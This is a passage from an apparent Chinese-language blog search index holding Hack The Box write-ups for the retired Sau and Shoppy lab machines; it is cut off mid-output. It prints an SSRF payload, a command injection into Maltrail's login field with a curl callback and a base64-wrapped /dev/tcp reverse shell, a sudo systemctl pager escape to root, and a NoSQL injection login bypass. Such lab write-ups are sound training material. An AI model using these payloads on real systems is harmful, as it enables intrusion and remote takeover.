<p>\u4e0d\u8fc7\u5148\u76f4\u63a5\u770b\u770b\u9875\u811a\u6709\u6ca1\u6709\u5199\u5173\u4e8e\u8fd9\u4e2a\u5e94\u7528\u7684\u4fe1\u606f\uff1a<code>Powered by request-baskets | Version: 1.2.1</code></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Sau/#poc-cve-2023-27163","title":"PoC (CVE-2023-27163)","text":"<p>\u8c37\u6b4c\u4e00\u4e0b\u201crequest-baskets version 1.2.1 exploit\u201d\uff0c\u76f4\u63a5\u53d1\u73b0\u4e00\u4e2agithub\u7684PoC </p> <p>POC: POST /api/baskets/{name} API with payload - {\"forward_url\": \"http://127.0.0.1:80/test\",\"proxy_response\": false,\"insecure_tls\": false,\"expand_path\": true,\"capacity\": 250} details can be seen: https://notes.sjtu.edu.cn/s/MUUhEymt7</p> <p>\u8bf4\u662fSSRF\uff0c\u8fd8\u9644\u4e0a\u4e86\u8be6\u7ec6\u4fe1\u606f\u7684\u94fe\u63a5\u3002\u770b\u4e86\u51e0\u904d\u90fd\u6ca1\u61c2\u600e\u4e48\u5229\u7528\uff0c\u4e8e\u662f\u8fd8\u662f\u56de\u5934\u7814\u7a76\u4e00\u4e0b\u8fd9\u4e2aweb\u5e94\u7528\u7684\u529f\u80fd\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Sau/#_3","title":"\u7814\u7a76\u7f51\u9875\u529f\u80fd","text":"<p>\u70b9\u4e86\u4e00\u4e0b <code>Create</code>\uff0c\u5c31\u4f1a\u521b\u5efa\u4e00\u4e2a\u6240\u8c13\u7684\u201cbasket\u201d\uff0c\u5e76\u7ed9\u4e86\u4e00\u4e2aURL\uff0c\u8bbf\u95ee\u8fd9\u4e2aURL\u540e\uff0c\u8bf7\u6c42\u7684\u8bb0\u5f55\u5c31\u4f1a\u51fa\u73b0\u5728\u8fd9\u4e2a\u7ba1\u7406\u754c\u9762\u3002</p> <p>\u987a\u4fbf\u770bburp\u7684\u6293\u5305\u53ef\u4ee5\u53d1\u73b0\uff0c\u521b\u5efa\u8fd9\u4e2abasket\u7684POST\u8bf7\u6c42\u6b63\u597d\u662fPoC\u91cc\u8bf4\u7684\u90a3\u4e2a\u53ef\u4ee5\u5229\u7528\u7684API\u3002 \u800c\u5728\u8fd9\u4e2a\u7ba1\u7406\u754c\u9762\u4e0a\u65b9\u6709\u4e2a\u8bbe\u7f6e\u6309\u94ae\uff0c\u70b9\u5f00\u53ef\u4ee5\u53d1\u73b0\u91cc\u9762\u7684\u53c2\u6570\u5373\u5bf9\u5e94PoC\u91ccpayload\u7684\u51e0\u4e2a\u53c2\u6570\u3002</p> <p></p> <p>\u6240\u4ee5\u57fa\u672c\u7406\u6e05\u695a\u4e86PoC\u7684\u5229\u7528\u65b9\u5f0f\u3002\u5373\u521b\u5efa\u4e00\u4e2a\u63a5\u6536\u8bf7\u6c42\u7684basket\uff0c\u5e76\u5c06\u5b83\u914d\u7f6e\u4e3a\u4f60\u60f3forward\u7684url\uff0cPoC\u6587\u7ae0\u91cc\u662f\u201chttp://127.0.0.1:80/test\u201d\u3002\u800c\u6211\u4eec\u8fd9\u53f0\u9776\u673a\u4e5f\u7591\u4f3c\u8fd0\u884c\u774080\u7aef\u53e3\uff0c\u53ea\u662f\u6ca1\u6709\u516c\u5f00\u3002\u6240\u4ee5\u5982\u679c\u6211\u4eec\u5c06forward_url\u914d\u7f6e\u4e3a\u201chttp://127.0.0.1:80\u201d\u5c31\u6709\u53ef\u80fd\u8bbf\u95ee\u5230\u90a3\u4e2a\u672c\u5730\u768480\u7aef\u53e3\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Sau/#exploit","title":"exploit\u5c1d\u8bd5","text":"<p>\u6700\u5f00\u59cb\u76f4\u63a5\u590d\u5236PoC\u7684payload\uff0c\u4ec5\u66f4\u6539\u4e86forward_url\uff0c\u7136\u540e\u8bbf\u95ee\u6211\u7684basket URL\u540e\u4f3c\u4e4e\u6beb\u65e0\u53cd\u5e94\uff1a <pre><code>\u2514\u2500$ curl -XPOST http://10.10.11.224:55555/api/baskets/testt1 --data '{\"forward_url\": \"http://127.0.0.1:80/\",\"proxy_response\": false,\"insecure_tls\": false,\"expand_path\": true,\"capacity\": 250}'\n{\"token\":\"slDpTH4PFTm5VvWg8_ouQxQAVfjA11yosY-XRQAJi451\"}\n\n\u2514\u2500$ curl http://10.10.11.224:55555/testt1\n</code></pre></p> <p>\u7422\u78e8\u4e86\u534a\u5929\uff0c\u6700\u7ec8\u5728Settings\u754c\u9762\u770b\u5230\u5173\u4e8e <code>proxy_response</code> \u53c2\u6570\u7684\u89e3\u91ca\uff08\u4e0b\u56fe\uff09\uff0c\u8fd9\u4e48\u770b\u7684\u8bdd\u8fd9\u4e2a\u754c\u9762\u76843\u4e2a\u65b9\u6846\u548ccapacity\u90fd\u662f\u5bf9\u4e8e <code>forward_url</code> \u7684\u914d\u7f6e\u3002\u800c\u521a\u521a\u7684payload\u91cc\u662f <code>\"proxy_response\": false</code>\uff0c\u5982\u679c\u8bbe\u7f6e\u4e3atrue\uff08\u5373\u5c06\u8fd9\u4e2a\u8bbe\u7f6e\u52fe\u4e0a\uff09\uff0c\u90a3\u4e48\u5e94\u8be5\u5728\u8bf7\u6c42\u6211\u4eec\u7684basket URL\u4e4b\u540e\uff0cbasket\u4f1a\u5c06\u8bf7\u6c42\u8f6c\u53d1\u5230 <code>forward_url</code> \u5e76\u63a5\u6536\u54cd\u5e94\u8fd4\u56de\u7ed9\u6211\u4eec\u3002\u76f8\u5f53\u4e8e\u662f\u4e2a\u4ee3\u7406\u3002 \u4e0d\u7406\u89e3payload\u53c2\u6570\u76f4\u63a5\u590d\u5236\u5c31\u7528\u4e0d\u53ef\u53d6\u554a\u2026\u2026 </p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Sau/#80","title":"\u672c\u573080\u7aef\u53e3\u66b4\u9732","text":"<p>\u4ee5\u53ca\u7a81\u7136\u60f3\u5230\uff0c\u65e2\u7136PoC\u7684payload\u5373\u7528POST API\u521b\u5efa\u4e00\u4e2a\u914d\u7f6e\u597d\u7684basket\uff0c\u90a3\u5176\u5b9e\u4e5f\u53ef\u4ee5\u4e0d\u7528\u547d\u4ee4\u884c\uff0c\u76f4\u63a5\u5728\u7f51\u9875\u521b\u5efabasket\u518d\u66f4\u6539\u8bbe\u7f6e\uff0c\u6548\u679c\u5e94\u8be5\u4e00\u6837\uff1f \u4e8e\u662f\u8bd5\u7740\u5728\u7f51\u9875\u521b\u5efabasket\u5e76\u6309\u4e0b\u56fe\u914d\u7f6e\u4e4b\u540e\uff0c\u8bbf\u95ee\u6211\u7684basket\uff08http://10.10.11.224:55555/poc11\uff09\u3002 </p> <p>\u679c\u7136\u53ef\u4ee5\u3002\u6210\u529f\u66b4\u9732\u76ee\u6807\u7684\u672c\u573080\u7aef\u53e3\u3002 \u672c\u6765\u4ee5\u4e3a\u4e00\u5b9a\u8981\u6309\u7167PoC\u7684\u53c2\u6570\u6765\uff0c\u6ca1\u60f3\u5230Settings\u754c\u9762\u7684capacity\u4fdd\u6301\u539f\u672c\u7684200\u4e0d\u53d8\u4e5f\u884c\u3002 </p> <p>\u5f88\u660e\u663e\uff0c\u8fd9\u4e2a80\u7aef\u53e3\u670d\u52a1\u7684\u9875\u811a\u5199\u7740 <code>Maltrail (v0.53)</code>\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Sau/#initial-access","title":"Initial Access","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Sau/#8338-poc-maltrail","title":"\u672c\u57308338\u7aef\u53e3 - PoC (Maltrail\u547d\u4ee4\u6ce8\u5165)","text":"<p>\u8c37\u6b4c\u201cMaltrail v0.53 exploit\u201d\uff0c\u53d1\u73b0PoC\u6587\u7ae0\u3002\u5f88\u6e05\u6670\uff0c\u5373\u767b\u9646\u754c\u9762\u7684username\u53c2\u6570\u6709\u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e\u3002 PoC\uff1a</p> <p>curl 'http://hostname:8338/login' \\  --data 'username=;`id &gt; /tmp/bbq`'</p> <p>\u539f\u6765\u6700\u5f00\u59cbnmap\u626b\u63cf\u7ed3\u679c\u91cc\u88abfiltered\u76848338\u5c31\u662f\u8fd9\u4e2aMaltrail\u554a\u3002\u90fd\u8054\u7cfb\u8d77\u6765\u4e86\uff01</p> <p>\u90a3\u4e48\u6d4b\u8bd5\u4e00\u4e0b8338\u8fd9\u4e2a\u547d\u4ee4\u6ce8\u5165\u3002 \u9996\u5148\u7ee7\u7eed\u5229\u7528\u4e4b\u524d\u90a3\u4e2aPoC\uff0c\u5c06basket\u7684forward_url\u8bbe\u7f6e\u66f4\u6539\u4e3a <code>http://127.0.0.1:8338/login</code>\uff0c\u8ba9\u672c\u57308338\u670d\u52a1\u7684\u76ee\u6807URL\u66b4\u9732\u3002 \u65e2\u7136\u662f\u547d\u4ee4\u6ce8\u5165\u7684\u8bdd\uff0c\u5148\u8bd5\u8bd5\u80fd\u5426\u6267\u884ccurl\u8fde\u5230\u6211\u7684kali\u5427\uff1a</p> <ul> <li>\u5728kali\u7528python\u7b80\u5355\u5f00\u4e2ahttp\u670d\u52a1\uff1a<code>python -m http.server 80</code></li> <li>\u7136\u540e\u5411basket\u53d1\u9001payload\uff1a<code>curl -XPOST http://10.10.11.224:55555/poc11 --data 'username=;`curl 10.xx.xx.xx:80`'</code> </li> </ul> <p>python\u7684http\u670d\u52a1\u6210\u529f\u6536\u5230\u54cd\u5e94\u3002  </p> <p>\u90a3\u4e48\u518d\u60f3\u60f3\u5982\u4f55\u5229\u7528\u8fd9\u4e2a\u547d\u4ee4\u6ce8\u5165\u2014\u2014\u65e2\u7136\u80fd\u53cd\u8fde\u56de\u6765\uff0c\u90a3\u5f53\u7136\u5f97\u5f04\u4e2a\u53cd\u5f39shell\u770b\u770b\u3002 \u5f00\u542f\u76d1\u542c\uff0c\u4e0d\u8fc7\u8bd5\u4e86\u597d\u51e0\u6761\u63d2\u5165\u53cd\u5f39shell\u7684\u547d\u4ee4\u90fd\u65e0\u6cd5\u6267\u884c\u6210\u529f\uff0c\u60f3\u7740\u53ef\u80fd\u662f\u7279\u6b8a\u5b57\u7b26\u7684\u95ee\u9898\uff0c\u4e8e\u662f\u5c1d\u8bd5\u4f20\u9012base64\u518d\u89e3\u7801\u6267\u884c\u7684\u65b9\u5f0f\u3002 \u6267\u884c\u4e0b\u9762payload\uff0c\u6210\u529fget shell\u3002\u5176\u4e2d <code>&lt;rshell-base64&gt;</code> \u7684\u90e8\u5206\u4e3a <code>/bin/bash -i &gt;&amp; /dev/tcp/10.xx.xx.xx/4444 0&gt;&amp;1</code> \u7684base64\u7f16\u7801\u3002</p> <ul> <li>payload\uff1a<code>curl -XPOST http://10.10.11.224:55555/poc11 --data 'username=;`echo \"&lt;rshell-base64&gt;\" |base64 -d |bash`'</code> </li> </ul>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Sau/#flag-user","title":"flag: user","text":"<p>\u8fdb\u6765\u7684shell\u662fpuma\u7528\u6237\u6743\u9650\uff0c\u770b\u4e00\u773chome\u76ee\u5f55\u53ea\u6709puma\uff0c\u6240\u4ee5\u8fd9\u5c31\u662f\u6709 user flag \u7684\u7528\u6237\u3002</p> <pre><code>puma@sau:/opt/maltrail$ id\nid\nuid=1001(puma) gid=1001(puma) groups=1001(puma)\npuma@sau:/opt/maltrail$ ls /home\nls /home\npuma\npuma@sau:/opt/maltrail$ cat /home/puma/user.txt\ncat /home/puma/user.txt\n6a04\u2026\u202697b7\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Sau/#privilege-escalation","title":"Privilege Escalation","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Sau/#_4","title":"\u63a2\u7d22","text":"<p>\u57fa\u7840\u63a2\u7d22\u4e00\u628a\u68ad\uff1a</p> <ul> <li>\u7528\u6237\u5bb6\u76ee\u5f55\u7684\u9690\u85cf\u6587\u4ef6\uff1a\u65e0</li> <li>SUID\uff1a\u65e0\u7279\u522b\u53d1\u73b0</li> <li>\u65e0\u5f53\u524d\u7528\u6237\u7684\u51ed\u636e\uff0c\u4e0d\u8fc7\u59d1\u4e14\u770b\u4e86\u773c <code>sudo -l</code>\uff1a\u7adf\u7136\u4e0d\u9700\u8981\u8f93\u5165\u5bc6\u7801\uff1f</li> </ul> <pre><code>puma@sau:/opt/maltrail$ sudo -l\nMatching Defaults entries for puma on sau:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser puma may run the following commands on sau:\n    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Sau/#shell-escape-sequences-sudosystemctl","title":"Shell Escape Sequences - sudo\u73af\u5883\u4e0b\u7684systemctl\u63d0\u6743","text":"<p>\u53ef\u4ee5\u53d1\u73b0\u6709\u4e00\u6761\u547d\u4ee4sudo\u6267\u884c\u662f\u4e0d\u8981\u5bc6\u7801\u7684\uff0c\u5148\u5c1d\u8bd5\u76f4\u63a5\u8fd0\u884c\u770b\u770b\u2014\u2014\u8f93\u51fa\u4e86\u4e00\u5806\u50cf\u662f\u8fdb\u7a0b\u547d\u4ee4\u7684\u8bb0\u5f55\u5230\u5c4f\u5e55\u2026\u2026</p> <p>\u5728GTFOBins\u4e0a\u9762\u641c <code>systemctl</code> \u4e5f\u4f1a\u5f88\u5bb9\u6613\u53d1\u73b0\u6709sudo\u65f6\u7684\u63d0\u6743\u65b9\u5f0f\uff0c\u4f46\u662f\u7531\u4e8e\u6211\u8fd0\u884c\u547d\u4ee4\u540e\u4f3c\u4e4e\u662f\u6240\u6709\u7ed3\u679c\u90fd\u8f93\u51fa\u5230\u4e86\u5c4f\u5e55\uff0c\u7136\u540e\u76f4\u63a5\u56de\u5230prompt\u6a21\u5f0f\uff0c\u6240\u4ee5\u6211\u5e76\u4e0d\u80fd\u6309\u7167\u5b83\u8bf4\u7684\u6267\u884c\u201c!sh\u201d\u8fdb\u884c\u63d0\u6743\u3002</p> <p>\u53c8\u4ed4\u7ec6\u770b\u770bGTFOBins\u91cc\u7684\u5185\u5bb9\uff0c\u6ce8\u610f\u5230\u4e0b\u9762\u5199\u4e86\u53e5\u201cThis invokes the default pager, which is likely to be less, other functions may apply.\u201d\u3002 \u4e8e\u662f\u7422\u78e8\u8fd9\u4e2a <code>less</code>\uff0c\u65e2\u7136less\u80fd\u7ffb\u9875\u3002\u90a3\u4e48\u63d0\u6743\u5931\u8d25\u662f\u4e0d\u662f\u56e0\u4e3a\u6ca1\u6709\u8c03\u7528\u51fa\u6240\u8c13\u7684\u201cdefault pager\u201d\uff0c\u6240\u4ee5\u4e4b\u524d\u8fd0\u884c\u547d\u4ee4\u624d\u4f1a\u4e00\u5806\u7ed3\u679c\u76f4\u63a5\u8f93\u51fa\u5230\u5c4f\u5e55\uff1f\u800c\u6ca1\u6709\u8c03\u7528\u201cdefault pager\u201d\u7ed9\u6211\u4f7f\u7528\uff0c\u53ef\u80fd\u662f\u56e0\u4e3a\u5f53\u524d\u4e0d\u662f\u4ea4\u4e92shell\uff1f</p> <p>\u4e8e\u662f\u8f6c\u4e3a\u4ea4\u4e92\u5f0fshell\u4e4b\u540e\u518d\u6b21\u5c1d\u8bd5\uff0c\u679c\u7136\u5c31\u6b63\u5e38\u4e86\u3002\u63d0\u6743\u4e5f\u6309\u7167GTFOBins\u91cc\u7684\u5185\u5bb9\uff0c\u5341\u5206\u7b80\u5355\uff1a <pre><code>puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service\n\u25cf trail.service - Maltrail. Server of malicious traffic detection system\n     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:&gt;\n     Active: active (running) since Sun 2023-07-09 05:26:40 UTC; 2h 13min ago\n       Docs: https://github.com/stamparm/maltrail#readme\n             https://github.com/stamparm/maltrail/wiki\n   Main PID: 889 (python3)\n      Tasks: 93 (limit: 4662)\n     Memory: 186.2M\n     CGroup: /system.slice/trail.service\n             \u251c\u2500  889 /usr/bin/python3 server.py\n             \u251c\u2500  960 /bin/sh -c logger -p auth.info -t \"maltrail[889]\" \"Failed &gt;\n             \u251c\u2500  964 /bin/sh -c logger -p auth.info -t \"maltrail[889]\" \"Failed &gt;\n             \u251c\u2500  968 bash\n             \u251c\u2500  969 bash -c bash -i &gt;&amp; /dev/tcp/10.10.16.29/9001 0&gt;&amp;1\n             \u251c\u2500  970 bash -i\n             \u251c\u2500  981 /bin/sh -c logger -p auth.info -t \"maltrail[889]\" \"Failed &gt;\n             \u251c\u2500  982 /bin/sh -c logger -p auth.info -t \"maltrail[889]\" \"Failed &gt;\n             \u251c\u2500  984 bash\n             \u251c\u2500  985 bash -i\n             \u251c\u2500  997 python3 -c import pty;pty.spawn(\"/bin/bash\")\n             \u251c\u2500  998 /bin/bash\n             \u251c\u2500 4311 /usr/bin/systemctl status trail.service\n             \u251c\u2500 4312 pager\n!sh\n# id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre></p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Sau/#flag-root","title":"flag: root","text":"<pre><code># pwd\n/opt/maltrail\n# cd\n# ls\ngo  root.txt\n# cat root.txt\nbe4f\u2026\u202686de\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Sau/#_5","title":"\u603b\u7ed3\u00b7\u540e\u8bb0","text":"<p>2023/07/09</p> <p>\u6700\u8fd1\u611f\u89c9\u53ea\u626b\u524d\u4e00\u4e07\u4e2a\u7aef\u53e3\u5df2\u7ecf\u4e0d\u80fd\u6ee1\u8db3\u6253HTB\u7684\u9700\u6c42\u5566\uff0c\u4ee5\u540e\u6253\u9776\u5e72\u8106\u76f4\u63a5\u5168\u7aef\u53e3\uff0c\u4e8e\u662f\u6539\u4e86\u6539\u626b\u63cf\u811a\u672c\u3002\u4ee5\u53ca\u8001\u662f\u5f15\u7528WP\u7684\u94fe\u63a5\u6bcf\u6b21\u6709\u6539\u52a8\u90fd\u6709\u70b9\u9ebb\u70e6\uff0c\u5c31\u5c06\u811a\u672c\u4e0a\u4f20\u5230\u4ed3\u5e93\u4e86\u3002</p> <p>\u8fd9\u6b21\u9776\u673a\u4e00\u4e2aPoC\u53cd\u590d\u7528\u633a\u6709\u610f\u601d\u7684\u3002</p> <p>\u4ee5\u53casudo -l\u4e0d\u7528\u5bc6\u7801\u8fd8\u633a\u610f\u5916\u7684\uff0c\u540e\u6765\u53c8\u53bb\u770b\u4e86\u773csudoers\u4f3c\u4e4e\u4e5f\u6ca1\u76f8\u5173\u914d\u7f6e\uff0c\u4e0d\u662f\u5f88\u61c2\uff1a </p> <p>\u3010\u7a7f\u8d8a\u3011\u540e\u6765\u7a0d\u5fae\u6d4b\u8bd5\u4e86\u4e00\u4e0b\uff0c\u4f3c\u4e4e\u65e0\u8bba\u4ec0\u4e48\u547d\u4ee4\u53ea\u8981\u662f\u914d\u7f6e\u4e86 <code>(ALL : ALL) NOPASSWD</code>\uff0c\u90a3\u4e48\u5c31\u80fd\u65e0\u5bc6\u7801\u6267\u884c <code>sudo -l</code>\u3002\u66f4\u5177\u4f53\u7684\u5c31\u6ca1\u8bd5\u4e86\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Sau/#systemctl-cve-2023-26604","title":"systemctl\u63d0\u6743\u7684\u8c03\u67e5 - CVE-2023-26604","text":"<p>\u5728kali\u4e5f\u5c1d\u8bd5\u4e86\u4e00\u4e0bGTFOBins\u91cc\u7684\u65b9\u5f0f\u63d0\u6743\uff0c\u4e0d\u8fc7\u6709\u4ec0\u4e48\u9650\u5236\u5bfc\u81f4\u65e0\u6cd5\u8f93\u5165\u611f\u53f9\u53f7\u3002</p> <p>\u4e8e\u662f\u8c03\u67e5systemctl\u4e0eless\u7684\u5173\u7cfb\uff0c\u4ee5\u53ca\u4e3a\u4ec0\u4e48less\u754c\u9762\u65e0\u6cd5\u8f93\u5165\u611f\u53f9\u53f7\u7b49\u3002 \u6839\u636e\u4e0b\u9762\u7684bug\u63d0\u4ea4\u5f97\u77e5\uff0c<code>systemctl status &lt;service&gt;</code> \u7684\u7ed3\u679c\u663e\u793a\u672c\u5e94\u8981pipe\u7ed9 <code>less</code> \u8fdb\u884c\u5206\u9875\u5c55\u793a\u7684\u3002  </p> <p>Bug#836580: systemd: systemctl status pipes through less with escape sequences not applied</p> <p>\u800c\u5728less\u5206\u9875\u4e2d\uff0c\u611f\u53f9\u53f7\u201c!\u201d\u662f\u4e00\u4e2a\u7279\u6b8a\u547d\u4ee4\uff0c\u5176\u540e\u9762\u7684\u547d\u4ee4\u4f1a\u88ab\u5f53\u505ashell\u547d\u4ee4\u6267\u884c\uff08\u548cvi\u7c7b\u4f3c\u554a\uff09\uff0c\u6240\u4ee5\u6709\u4e00\u5b9a\u7684\u9632\u62a4\u63aa\u65bd\u3002\u6700\u7ec8\u641c\u5230\u4e86\u8fd9\u4e2a\u3002\u5176\u4e2d\u6709\u63d0\u5230systemd\u7248\u672c247\u4e4b\u524d\u90fd\u6709\u6f0f\u6d1e\uff0c\u4e8b\u540e\u786e\u8ba4\u4e86\u4e00\u4e0b\u9776\u673a\u7684systemd\u7248\u672c\u662f245\u3002</p> <p>\u4ee5\u53ca\u7a81\u7136\u60f3\u8d77\u6765\u5728less\u7684\u5206\u9875\u754c\u9762\u597d\u50cf\u53ef\u4ee5\u6309\u201cv\u201d\u8fdb\u5165\u7c7b\u4f3cvi\u7684\u7f16\u8f91\u754c\u9762\u3002\u800c\u5728vi\u7f16\u8f91\u5668\u53ef\u4ee5\u7528\u5192\u53f7\u8f93\u5165\u547d\u4ee4\uff0c\u5e76\u4e14\u7531\u4e8e\u611f\u53f9\u53f7\u540e\u7684\u547d\u4ee4\u89e3\u6790\u4e3ashell\u547d\u4ee4\uff0c\u5373\u7528 <code>:!sh</code> \u53ef\u4ee5\u9003\u9038vi\u3002\u8fd9\u53f0\u9776\u673a\u662f\u5426\u4e5f\u53ef\u4ee5\uff1f\u7136\u800c\u8bd5\u4e86\u4e00\u4e0b\u5728less\u7684\u5206\u9875\u754c\u9762\u6309\u201cv\u201d\u8fdb\u5165\u7f16\u8f91\u6a21\u5f0f\u770b\u770b\u80fd\u5426\u63d0\u6743\u2014\u2014\u4e0d\u8fc7\u5f53\u6211\u6309\u4e0b\u201cv\u201d\uff0c\u4f1a\u663e\u793a\u201cCannot edit standard input  (press RETURN)\u201d\u2026\u2026  </p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Shoppy/","title":"HTB-Shoppy","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Shoppy/#_1","title":"\u626b\u63cf","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Shoppy/#_2","title":"\u7aef\u53e3","text":"<p><pre><code>nmap -v -n -Pn -sCV -oN Shoppy.nmap 10.10.11.180\n</code></pre> \u53ea\u626b\u51fa22\u548c80\u7aef\u53e3\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Shoppy/#_3","title":"\u6f0f\u6d1e\u5206\u6790","text":"","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Shoppy/#80","title":"80\u7aef\u53e3","text":"<p>\u5c06\u9776\u673a\u57df\u540d\u52a0\u5165hosts\u540e\u8bbf\u95ee\u3002 \u867d\u7136\u611f\u89c9HTB\u7684\u9776\u673a\u57df\u540d\u5e94\u8be5\u90fd\u633a\u56fa\u5b9a\u7684\uff0c\u59d1\u4e14\u5199\u4e86\u4e2a\u547d\u4ee4\u884c\uff0c\u6536\u96c6\u57df\u540d\u540e\u52a0\u5165hosts\u6587\u4ef6\uff0c\u770b\u770b\u4ee5\u540e\u80fd\u5426\u901a\u7528\uff1a <pre><code>HTB_IP='10.10.11.180'; cat -e /etc/hosts &amp;&amp; sudo sh -c \"echo \\\"${HTB_IP}    $(curl -I ${HTB_IP} | grep -oP '(?&lt;=Location: http://).*' | sed 's/\\r//g')\\\"  &gt;&gt; /etc/hosts\"; cat -e /etc/hosts\n</code></pre></p> <ul> <li>\u65e0robots  </li> <li>\u7f51\u9875\u6e90\u7801\u65e0\u53d1\u73b0  </li> <li>\u7f51\u7ad9\u65e0\u7279\u522b\u529f\u80fd</li> </ul> <p>\u672c\u6765\u6253\u7b97\u679a\u4e3e\u4e00\u4e0b\u76ee\u5f55\uff0c\u4e0d\u8fc7\u60ef\u4f8b\u8bd5\u4e86\u4e00\u4e0b <code>/login</code> \u53ef\u4ee5\u3002 \u5728\u767b\u9646\u754c\u9762\u5c1d\u8bd5\u4e86\u51e0\u4e2aSQLi\u7ed5\u8fc7\u672a\u679c\u3002SQLi\u53ea\u4f1a\u4e00\u70b9\u57fa\u7840\u7684\u2026\u2026\u5361\u4f4f  </p> <p>\u641c\u4e86\u4e00\u6ce2WP\u539f\u6765\u8fd9\u91cc\u662f NoSQL \u2026\u2026</p> <p><code>admin'||'1==1</code> \u6210\u529f\u767b\u5165\u3002</p> <p>admin\u754c\u9762\u6709\u641c\u7d22\u6846\uff0c\u8f93\u5165 <code>admin</code> \u641c\u7d22\u6709\u56de\u663eadmin\u7684\u5bc6\u7801\u3002\u770b\u4e0a\u53bb\u611f\u89c9\u662fMD5\u52a0\u5bc6\u3002 \u5728\u641c\u7d22\u6846\u8f93\u5165\u540c\u6837\u7684 <code>NoSQLi</code>\uff0c\u6210\u529f\u56de\u663e\u6240\u6709\u7528\u6237\uff08admin\u548cjosh\uff09\u7684\u8d26\u53f7\u5bc6\u7801\u3002</p> <p>\u653e\u8fdbMD5\u89e3\u7801\u7f51\u7ad9\u8bd5\u8bd5\u3002<code>josh</code> \u7528\u6237\u53ef\u6210\u529f\u89e3\u7801\u3002</p> <p>\u4f46\u662f\u81f3\u6b64\u4f3c\u4e4e\u6ca1\u4ec0\u4e48\u5176\u4ed6\u653b\u51fb\u8def\u5f84\u4e86\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Shoppy/#_4","title":"\u5b50\u57df\u679a\u4e3e","text":"<p>\u7531\u4e8e\u662f\u9776\u673a\u6240\u4ee5\u53ea\u626b\u865a\u62df\u4e3b\u673a\u7684\u5b50\u57df</p> <pre><code>gobuster vhost -u shoppy.htb -w /usr/share/wordlists/amass/bitquark_subdomains_top100K.txt -t 500 --append-domain\n</code></pre> <p>\u626b\u51fa\u4e00\u4e2a\uff1a<code>Found: mattermost.shoppy.htb Status: 200 [Size: 3122]</code>\uff0c\u5c06\u5176\u4e5f\u52a0\u5165hosts\u3002 \u6700\u5f00\u59cb\u6ca1\u52a0 <code>--append-domain</code> \u5565\u90fd\u6ca1\u626b\u51fa\u6765\u3002\u6240\u4ee5\u6700\u597d\u6b63\u5f0f\u5f00\u626b\u4e4b\u524d\u52a0\u4e0a <code>-v</code> \u5c0f\u626b\u4e00\u4e0b\u770b\u770b\uff0c\u5426\u5219\u90fd\u4e0d\u77e5\u9053\u81ea\u5df1\u626b\u7684\u662f\u5565\u5bb9\u6613\u9519\u8fc7\u7a81\u7834\u53e3\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Shoppy/#_5","title":"\u4ece\u5b50\u57df\u7a81\u7834","text":"<p>\u4f46\u662f\u8bbf\u95ee\u540e\u662f\u7a7a\u767d\u9875\u9762\uff0c\u8bd5\u7740\u5237\u65b0\u51e0\u6b21\u53d1\u73b0\u4f3c\u4e4e\u6709\u4e00\u95ea\u800c\u8fc7\u7684\u767b\u9646\u754c\u9762\u3002 \u5f00burp\u62e6\u622a\u4f7f\u5176\u505c\u5728\u767b\u5f55\u754c\u9762\uff0c\u8f93\u5165\u521a\u7834\u89e3\u7684 <code>josh</code> \u7684\u8d26\u53f7\u5bc6\u7801\uff0c\u6210\u529f\u767b\u5165\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Shoppy/#foothold","title":"foothold","text":"<p>\u662f\u4e00\u4e2a\u804a\u5929\u5de5\u5177\u7684\u6837\u5b50\u3002\u6709\u4e2a\u5e26\u9501\u7684\u9891\u9053\u5341\u5206\u5f15\u4eba\u6ce8\u610f\u3002\u770b\u4e86\u773c\u5185\u5bb9\u662f\u8ba9\u6211\u4eec\uff08josh\uff09\u90e8\u7f72\u4e00\u4e2a\u673a\u5668\u3002\u8fd8\u6709\u8d26\u53f7\u5bc6\u7801\uff1a  </p> <pre><code>username: jaeger\npassword: Sh0ppyBest@pp!\n</code></pre> <p>SSH\u767b\u9646\u6210\u529f\u3002</p>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Shoppy/#get-user-flag","title":"get user flag","text":"<pre><code>jaeger@shoppy:~$ cat user.txt\n</code></pre>","tags":["HTB/Linux","HTB/Easy"]},{"location":"writeup/retired/HTB-Shoppy/#_6","title":"\u6a2a\u5411\u79fb\u52a8","text":"<p>\u9996\u5148\u770b\u770b <code>sudo -l</code>\uff1a <pre><code>jaeger@shoppy:~$ id\nuid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger)\n\n\njaeger@shoppy:~$ sudo -l\nMatching Defaults 